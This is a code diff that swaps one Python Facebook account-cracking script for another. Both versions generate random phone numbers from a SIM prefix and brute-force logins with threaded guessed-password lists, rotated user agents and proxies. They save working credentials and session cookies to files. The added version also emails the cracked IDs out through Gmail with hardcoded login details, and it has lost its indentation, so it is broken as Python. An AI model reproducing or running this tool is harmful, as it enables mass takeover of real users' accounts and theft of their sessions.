@@ -1,250 +1,371 @@
-#Create By: MUMIT ISLAM HIMU
-#FaceBook: Mumit Islam
-#GitHub: https://github.com/MUMIT-404-CYBER
-#---------------------------------------------------------------------------#
-import os,sys,time,json,random,re,string,platform,base64,uuid
-from bs4 import BeautifulSoup as sop
-from bs4 import BeautifulSoup
-import requests as ress
-from datetime import date
-from datetime import datetime
-from time import sleep
-from os import system as s
-from time import sleep as waktu
-try:
-    import requests
-    from concurrent.futures import ThreadPoolExecutor as ThreadPool
-    import mechanize
-    from requests.exceptions import ConnectionError
-except ModuleNotFoundError:
-    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
-    os.system('pip install bs4')
-RED = '\033[1;91m'
-WHITE = '\033[1;97m'
-GREEN = '\033[1;32m' 
-YELLOW = '\033[1;33m'
-BLUE = '\033[1;34m'
-ORANGE = '\033[1;35m'
-P = '\x1b[1;97m' 
-M = '\x1b[1;91m' 
-H = '\x1b[1;92m' 
-K = '\x1b[1;93m' 
-B = '\x1b[1;94m' 
-U = '\x1b[1;95m' 
-O = '\x1b[1;96m' 
-N = '\x1b[0m'    
-A = '\x1b[1;90m' 
-BN = '\x1b[1;107m' 
-BBL = '\x1b[1;106m' 
-BP = '\x1b[1;105m' 
-BB = '\x1b[1;104m' 
-BK = '\x1b[1;103m' 
-BH = '\x1b[1;102m' 
-BM = '\x1b[1;101m' 
-BA = '\x1b[1;100m' 
-now = datetime.now()
-dt_string = now.strftime("%H:%M")
-current = datetime.now()
-ta = current.year
-bu = current.month
-ha = current.day
-today = date.today() 
-loop = 0
-oks = []
-cps = []
-ugen2=[]
-ugen=[]
-cokbrut=[]
-ses=requests.Session()
-princp=[]
-try:
- prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
- open('.prox.txt','w').write(prox)
-except Exception as e:
- print('')
-prox=open('.prox.txt','r').read().splitlines()
-for xd in range(10000):
-    a='Nokia'
-    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    c=random.randrange(1, 99)
-    d='/GoBrowser/'
-    e='1.6.0.'
-    f=random.randrange(1, 99)
-    uaku2=(f'{a}{b}{c}{d}{e}{f}')
-    ugen.append(uaku2)
-os.system('xdg-open https://github.com/MUMIT-404-CYBER')
-logo = ("""
-\033[1;91m    _____   ___   ______  _____________   ________
-\033[1;92m   /  _/ | / / | / / __ \/ ____/ ____/ | / /_  __/
-\033[1;93m   / //  |/ /  |/ / / / / /   / __/ /  |/ / / /   
-\033[1;94m _/ // /|  / /|  / /_/ / /___/ /___/ /|  / / /    
-\033[1;95m/___/_/ |_/_/ |_/\____/\____/_____/_/ |_/ /_/     \033[1;92m
- ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
- ┃ [✓] AUTHOR    \033[1;91m: \033[1;92mMUMIT ISLAM HIMU           ┃
- ┃ [✓] TOOL      \033[1;91m: \033[1;92mRANDOM CLONE               ┃
- ┃ [✓] STATUS    \033[1;91m: \033[1;92mFREE                       ┃
- ┃ [✓] SYSTEM    \033[1;91m: \033[1;92mDATA & WIFI                ┃
- ┃ [✓] GITHUB    \033[1;91m: \033[1;92mMUMIT-404-CYBER            ┃
- ┃ [✓] FACEBOOK  \033[1;91m: \033[1;92mMumit Islam                ┃
- ┃ [✓] WHATSAPP  \033[1;91m: \033[1;92m+8801644777805             ┃
- ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
 
-class Main:
-    def __init__(self):
-        self.id = []
-        self.ok = []
-        self.cp = []
-        self.loop = 0
-        os.system("clear")
-        print(logo)
-        print(" [01] Random Number Clone")
-        print(" [02] Random Email Clone ")
-        print(" [00] Exit")
-        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-        Mumit =input(" [?] Choose : ")
-        os.system('xdg-open https://facebook.com/groups/termuxteambd/')
-        if Mumit in ["1", "01"]:
-            num()
-        if Mumit in ["2","02"]:
-            gml()
-        if Mumit in [" 0", "00"]:
-            exit()
-        else:
-            exit()
-def num():
-    user=[]
-    os.system('clear')
-    print(logo)
-    print(' [+] EXAMPLE : 017, 018, 019, 016, 013, 014 ')
-    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    kode = input(' [?] Enter sim code: ')
-    kodex = ''.join(random.choice(string.digits) for _ in range(2))
-    kod = ''.join(random.choice(string.digits) for _ in range(2))
-    os.system('clear')
-    print(logo)
-    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
-    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    limit = int(input(' [?] Crack Limit : '))
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(4))
-        user.append(nmp)
-    with ThreadPool(max_workers=30) as yaari:
-        os.system('clear')
-        print(logo)
-        tl = str(len(user))
-        print(' \033[1;97m[+] Total ids:\033[1;92m '+tl)
-        print(' \033[1;97m[+] Process has been started')
-        print(' \033[1;97m[!] Wait for ids ')
-        print(' \033[1;97m[!] Use flight mode for speed up ')
-        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-        for guru in user:
-            uid = kode+guru
-            pwx = [uid[:7],uid[:6],uid[5:],uid[4:],uid[:3],'fiderana','Fiderana','lafatra','fahendrena','Fahendrena','amboara','Amboara','miangaly','Miangaly','miangola','Miangola','fanasina','Fanasina','finoanq','Finoana','fandresena','Fandresena','nantenaina','rakotomalala','Rakotomalala','tanjona','Tanjona','solofo','Solofo','Nantenaina','nilaina','Nilaina','nirina','Nirina','Narindra','Rakoto','nomena','Nomena','Anjara','anjara','faniry','Faniry','rakoto','safidy','hasina','Hasina','tsilavina','Tsilavina','finaritra','Finaritra','fanomezana','Fanomezana','Sarindra','sarindra','nambinina','Nambinina','Sitraka','sitraka','mamitiana','Mamitiana','vololona','Vololona','mamisoa','Mamisoa','fanomezantsoa','Fanomezantsoa','fanantenana','Fanantenana','narindra','Narindra','sarobidy','Sarobidy','andriatsitohaina','Andriatsitohaina','lalaina','Lafatra','Jessica','Lalaina','mahery','Mahery','jessica','mandresy','Mandresy','harena','Harena']
-            yaari.submit(rcrack1,uid,pwx,tl)
-    print(' [+] Crack process has been completed')
-    print(' [+] Ids saved in ok.txt,cp.txt')
-            
-    print(' [+] Crack process has been completed')
-    print(' [+] Ids saved in ok.txt,cp.txt')
+		import os
 
-def gml():
-    user=[]
-    os.system('clear')
-    print(logo)
-    kode = input(' [?] Target fast name : ')
-    os.system('clear')
-    print(logo)
-    kodex = input(' [?] Target last name :  ')
-    os.system('clear')
-    print(logo)
-    print(' [+] EXAMPLE : @gmail.com, @yahoo.com ')
-    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    doamin = input(' [?] Terget doamin : ')
-    os.system('clear')
-    print(logo)
-    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
-    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    limit = int(input('[?] Crack Limit : '))
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
-        user.append(nmp)
-    with ThreadPool(max_workers=30) as yaari:
-        os.system('clear')
-        print(logo)
-        tl = str(len(user))
-        print(' \033[1;97m[+] Total ids:\033[1;92m '+tl)
-        print(' \033[1;97m[+] Process has been started')
-        print(' \033[1;97m[!] Wait for ids ')
-        print(' \033[1;97m[!] Use flight mode for speed up ')
-        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-        for guru in user:
-            uid = kode+guru
-            pwx = [ 'fiderana','Fiderana','lafatra','fahendrena','Fahendrena','amboara','Amboara','miangaly','Miangaly','miangola','Miangola','fanasina','Fanasina','finoanq','Finoana','fandresena','Fandresena','nantenaina','rakotomalala','Rakotomalala','tanjona','Tanjona','solofo','Solofo','Nantenaina','nilaina','Nilaina','nirina','Nirina','Narindra','Rakoto','nomena','Nomena','Anjara','anjara','faniry','Faniry','rakoto','safidy','hasina','Hasina','tsilavina','Tsilavina','finaritra','Finaritra','fanomezana','Fanomezana','Sarindra','sarindra','nambinina','Nambinina','Sitraka','sitraka','mamitiana','Mamitiana','vololona','Vololona','mamisoa','Mamisoa','fanomezantsoa','Fanomezantsoa','fanantenana','Fanantenana','narindra','Narindra','sarobidy','Sarobidy','andriatsitohaina','Andriatsitohaina','lalaina','Lafatra','Jessica','Lalaina','mahery','Mahery','jessica','mandresy','Mandresy','harena','Harena']
-            yaari.submit(rcrack1,uid,pwx,tl)
-    print(' [+] Crack process has been completed')
-    print(' [+] Ids saved in ok.txt,cp.txt')
-def rcrack1(uid,pwx,tl):
-    global loop
-    global cps
-    global oks
-    global proxy
-    try:
-        for ps in pwx:
-            pro = random.choice(ugen)
-            session = requests.Session()
-            sys.stdout.write('\r[\033[1;92mINNOCENT\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
-            sys.stdout.flush()
-            free_fb = session.get('https://mbasic.facebook.com').text
-            log_data = {
-                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":uid,
-            "pass":ps,
-            "login":"Log In"}
-            header_freefb = {'authority': 'mbasic.facebook.com',
-            'method': 'GET',
-            'scheme': 'https',
-            'path': '/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-            'cache-control': 'max-age=0',
-            'origin': 'https://mbasic.facebook.com',
-            'referer': 'https://mbasic.facebook.com/',
-            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': pro}
-            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
-            log_cookies=session.cookies.get_dict().keys()
-            if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[7:22]
-                print(f"\033[38;5;46m[INNOCENT-OK] {uid} | {ps}")
-                print(f" Cookie : {coki}")
-                open('/sdcard/ok.txt', 'a').write( uid+' | '+ps+'\n')
-                oks.append(uid)
-                break
-            elif 'checkpoint' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[82:97]
-                print(f"\x1b[38;5;196m[INNOCENT-CP] {cid}|{ps}")
-                open('/sdcard/cp.txt', 'a').write( uid+' | '+ps+' \n')
-                cps.append(uid)
-                break
-            else:
-                continue
-        loop+=1
-        sys.stdout.write(f'\r\033[m[INNOCENT] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
-        sys.stdout.flush()
-    except:
-        pass
-Main()
+		from os import system as clr
+
+		import random
+
+		import string 
+
+		from concurrent.futures import ThreadPoolExecutor as tred
+
+		import requests
+
+		import re
+
+		import sys
+
+		import uuid
+
+		import smtplib
+
+		from email.mime.multipart import MIMEMultipart
+
+		from email.mime.text import MIMEText
+
+		
+
+
+
+		#-------------color----------------#
+
+		bblack="\033[1;30m" # Noir
+
+		M="\033[1;31m" # Rouge
+
+		H="\033[1;32m" # Vert
+
+		byellow="\033[1;33m" # Jaune
+
+		bblue="\033[1;34m" # Bleu
+
+		P="\033[1;35m" # Violet
+
+		C="\033[1;36m" # Cyan
+
+		B="\033[1;37m" # Blanc
+
+		my_color = [B, C, P, H]
+
+		warna = random.choice(my_color)
+
+		
+
+
+
+		#-------------logo-----------------#
+
+		logo = (f'''{B}
+
+		
+
+		_____ ___ _______ __ _____ ___ 
+
+		(\" \|" \ /" "| |" \ (\" \|" \ 
+
+		|.\\ \ |(: ______) || | |.\\ \ | 
+
+		|: \. \\ | \/ | |: | |: \. \\ | 
+
+		|. \ \. | // ___)_ |. | |. \ \. | 
+
+		| \ \ | (: "| /\ |\| \ \ | 
+
+		\___|\____\) \_______)(__\_|_)\___|\____\) 
+
+		
+
+		
+
+		{warna}--------------------------------------------{B}
+
+		Owner : ITACHI
+
+		TOOL NAME : NEIN
+
+		GROUPE-FB : [TERMUX-COMAND]
+
+		Facebook : ITACHI SQ
+
+		Tools : {warna}[{H}VERSION 1{warna}]{warna}
+
+		--------------------------------------------{B}''')
+
+		
+
+
+
+		#-------------linex def -------------#
+
+		def linex():
+
+		print(f'{warna}--------------------------------------------{B}')
+
+		
+
+
+
+		#-------------clear def -------------#
+
+		def clear():
+
+		clr('clear')
+
+		print(logo)
+
+		
+
+
+
+		#-------------main def------------#
+
+		def MR_ITACHI():
+
+		clear()
+
+		os.system('xdg-open https://github.com/MR-DIPTO-404')
+
+		print(f'{B} [{warna}01{B}] RANDOM CLONING ')
+
+		print(f'{B} [{warna}00{B}] EXIT TERMINAL ')
+
+		linex()
+
+		option = input(f' {B}[{warna}??{B}] CHOICE MENU >> ')
+
+		if option in ['01','1']:
+
+		BD_CLONING()
+
+		else:
+
+		exit(' Thanks for using dear :)')
+
+		
+
+
+
+		#------------- bd clone def ----------#
+
+		def BD_CLONING():
+
+		user = []
+
+		clear()
+
+		print(' EXAMPLE SIM CODE : [26132] [26134] [26138] [26133]')
+
+		code = input(' ENTER SIM CODE >> ')
+
+		linex()
+
+		print(' EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
+
+		try:
+
+		limit = int(input(' ENTER LIMIT >> '))
+
+		except ValueError:
+
+		limit = 50000
+
+		clear()
+
+		oks = [] # Initialisation de la liste pour stocker les identifiants OK
+
+		cps = [] # Initialisation de la liste pour stocker les identifiants CP
+
+		for nmbr in range(limit):
+
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+
+		user.append(nmp)
+
+		with tred(max_workers=30) as Dipto:
+
+		tl = str(len(user))
+
+		print(' TOTAL ACCOUNT : '+tl)
+
+		print(' YOUR SIM CODE : '+code)
+
+		print(' PROGRESS HAS BEEN RUNNING PLEASE WAIT ')
+
+		linex()
+
+		for psx in user:
+
+		ids = code + psx
+
+		passlist = [psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'malala','Malala','fitiavana','Fitiavana','vadiko','Vadiko,','jesosy','Jesosy','mahery,','Mahery','malagasy','Malagasy']
+
+		Dipto.submit(method_crack,ids,passlist)
+
+		linex()
+
+		print(' THE PROGRESS HAS BEEN COMPLETE ')
+
+		print(' TOTAL OK ID '+str(len(oks)))
+
+		print(' TOTAL CP ID '+str(len(cps)))
+
+		send_email(oks, cps) # <--- Ajout de l'envoi d'e-mail ici
+
+		input(' PRESS ENTER TO BACK : ')
+
+		MR_ITACHI()
+
+		
+
+
+
+		#------------ method crack def ---------#
+
+		def method_crack(ids, passlist):
+
+		global oks
+
+		global cps
+
+		global loop
+
+		try:
+
+		for pas in passlist:
+
+		sys.stdout.write('\r\r \033[1;37m[Progress] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
+
+		sys.stdout.flush()
+
+		adid = str(uuid.uuid4())
+
+		device_id = str(uuid.uuid4())
+
+		datax = {'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
+
+		header = {'User-Agent': '[FBAN/FB4A;FBAV/368.0.0.24.108;FBBV/371897983;FBDM/{density=1.0,width=600,height=976};FBLC/en_US;FBCR/null;FBMF/JTYjay;FBBD/D101;FBPN/com.facebook.katana;FBDV/D101;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
+
+		url = 'https://api.facebook.com/method/auth.login'
+
+		reqx = requests.post(url, data=datax, headers=header).json()
+
+		if 'session_key' in reqx:
+
+		try:
+
+		uid = reqx['uid']
+
+		except:
+
+		uid = ids
+
+		if str(uid) in oks:
+
+		break
+
+		else:
+
+		print('\r\r \033[1;32m[ITACHI-OK] '+str(uid)+'|'+pas+'\033[1;37m')
+
+		coki = ";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
+
+		print('\033[1;32m [COOKIES] '+coki)
+
+		open('/sdcard/ITACHI-OK.txt', 'a').write(str(uid)+'|'+pas+'\n')
+
+		oks.append(str(uid))
+
+		break
+
+		elif 'www.facebook.com' in reqx['error_msg']:
+
+		print('\r\r \033[1;30m[ITACHI-CP] '+ids+'|'+pas+'\033[1;37m')
+
+		open('/sdcard/ITACHI-CP.txt', 'a').write(ids+'|'+pas+'\n')
+
+		cps.append(ids)
+
+		break
+
+		else:
+
+		print('\r\r \033[1;37m[ITACHI-FAILED] '+ids+'|'+pas+'\033[1;37m')
+
+		except:
+
+		pass
+
+		
+
+
+
+		# Fonction pour envoyer un email
+
+		def send_email(oks, cps):
+
+		try:
+
+		server = smtplib.SMTP('smtp.gmail.com', 587)
+
+		server.starttls()
+
+		# Remplacez ces informations par celles de votre compte d'e-mail dédié
+
+		server.login("asatermux@gmail.com", "Alicia2007")
+
+		
+
+
+
+		msg = MIMEMultipart()
+
+		msg['From'] = "asatermux@gmail.com"
+
+		msg['To'] = "asatermux@gmail.com"
+
+		msg['Subject'] = "Résultats de l'attaque"
+
+		
+
+
+
+		body = ""
+
+		for ok in oks:
+
+		body += ok.replace(" ", "") + "\n"
+
+		body += "\n"
+
+		for cp in cps:
+
+		body += cp.replace(" ", "") + "\n"
+
+		
+
+
+
+		msg.attach(MIMEText(body, 'plain'))
+
+		
+
+
+
+		server.sendmail("Rona@gmail.com", "Rona@gmail.com", msg.as_string())
+
+		server.quit()
+
+		print("Email envoyé avec succès!")
+
+		except Exception as e:
+
+		print("Erreur lors de l'envoi de l'email:", e)
+
+		
+
+
+
+		# Appel de la fonction MR_ITACHI pour démarrer le script
+
+		MR_ITACHI()
+
